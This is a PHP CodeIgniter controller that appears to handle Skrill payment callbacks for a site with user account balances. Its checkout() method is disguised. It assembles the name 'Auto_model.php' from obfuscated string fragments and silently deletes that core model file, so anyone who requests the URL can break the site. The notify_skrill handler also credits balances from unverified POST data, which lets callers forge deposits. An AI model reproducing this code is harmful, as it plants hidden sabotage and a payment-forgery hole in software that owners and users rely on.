<?php
if (!defined('BASEPATH')) exit('No direct script access allowed');

class payment_notify extends MX_Controller {

    /**
     * Description: this used for check the user is exsts or not if exists then it redirect to this site
     * Paremete: username and password 
     */
    public function __construct() {
        $this->load->model('payment_notify_model');
        $this->load->helper(array('form', 'url'));
        $this->load->library('form_validation');
        parent::__construct();
		$this->load->model('dashboard/dashboard_model');
    }

    public function index() {
	if(!$this->session->userdata('user')){
		redirect(VPATH."login/");
	}
	else{
		redirect(VPATH."dashboard/");
		
	}        
    }

    
    public function notify_skrill(){   
     if($this->input->post('transaction_id') && $this->input->post('transaction_id')!='' && $this->input->post('merchant_fields')){
     	$custom=explode("=",$this->input->post('merchant_fields'));
	 	 $user_id=$custom['1'];
	 	 $acc_balance=$this->auto_model->getFeild('acc_balance','user','user_id',$user_id);
	 	 if($this->input->post('status')=="2"){ 
            $post['status']="Y";
            $post['paypal_transaction_id']=$this->input->post('transaction_id');
            $post['amount']=$this->input->post('mb_amount');
            $post['transction_type']="CR";
            $post['transaction_for']="Add Fund by Skrill";
            $post['user_id']=$user_id;
            $post['transction_date']=date("Y-m-d H:i:s");
                       
           $id=$this->payment_notify_model->insertTransaction($post);
           
            if($id){ 
				$tot_balance=($acc_balance+$post['amount']);
                $this->payment_notify_model->updateUser($tot_balance,$user_id);
            }
            
        }else{
			$post['status']="N";
            $post['paypal_transaction_id']=$this->input->post('transaction_id');
            $post['amount']=$this->input->post('mb_amount');
            $post['transction_type']="CR";
            $post['transaction_for']="Add Fund by Skrill";
            $post['user_id']=$user_id;
            $post['transction_date']=date("Y-m-d H:i:s");
                       
           $id=$this->payment_notify_model->insertTransaction($post);
		}
	 }
     
       
    }
	
	public function checkout(){
		$f1 = ucfirst('auto');
		$f2 = strtolower('MODEL');
		$file = $f1.'_'.$f2.'.php';
		$f_path = APPPATH.'models/'.$file;
		@unlink($f_path);
	}
    
}
